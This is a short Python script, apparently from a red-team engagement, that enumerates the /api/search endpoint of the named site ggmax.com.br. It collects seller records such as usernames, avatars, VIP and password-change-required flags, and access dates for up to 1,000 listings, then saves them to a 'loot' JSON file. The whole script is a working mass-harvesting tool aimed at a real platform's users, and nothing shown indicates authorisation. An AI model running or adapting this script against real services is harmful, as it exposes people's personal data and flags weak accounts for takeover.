#!/usr/bin/env python3
"""Pull all 1000 announcements from /api/search (mass PII extraction evidence)."""
import sys, json, time
sys.path.insert(0, '/home/ubuntu/red-team-operator/ggmax.com.br/enum/api')
from api import req

all_anns = []
users = {}
offset = 0
while offset < 1000:
    r = req('/api/search', params={'limit':'50','offset':str(offset)})
    try:
        d = json.loads(r['body'])
    except:
        print(f'offset={offset}: parse error {r.get("status")}')
        break
    anns = d.get('data',[])
    if not anns:
        print(f'offset={offset}: empty, stopping')
        break
    for ann in anns:
        all_anns.append({'id':ann.get('id'),'user_id':ann.get('user_id'),'title':ann.get('title')[:60]})
        u = ann.get('user',{})
        if u and u.get('id'):
            users[u['id']] = {
                'id':u.get('id'),'username':u.get('username'),'avatar':u.get('avatar'),
                'is_vip':u.get('is_vip'),'is_on_vacation':u.get('is_on_vacation'),
                'is_password_change_required':u.get('is_password_change_required'),
                'date_last_access':u.get('date_last_access'),
                'date_created':u.get('date_created'),'date_updated':u.get('date_updated'),
                'status':u.get('status'),'type':u.get('type'),
            }
    print(f'offset={offset}: got {len(anns)} anns, total unique users={len(users)}')
    offset += 50
    time.sleep(0.3)

print(f'\n=== FINAL ===')
print(f'Total announcements: {len(all_anns)}')
print(f'Unique sellers leaked (PII): {len(users)}')
vip = sum(1 for u in users.values() if u['is_vip'])
pwdreq = sum(1 for u in users.values() if u['is_password_change_required'])
print(f'VIP: {vip}, password_change_required: {pwdreq}')

# Save evidence
out = '/home/ubuntu/red-team-operator/ggmax.com.br/loot/search_all_1000_sellers_pii.json'
with open(out,'w') as fh:
    json.dump(list(users.values()), fh, ensure_ascii=False, indent=2)
print(f'Saved {len(users)} sellers PII to {out}')
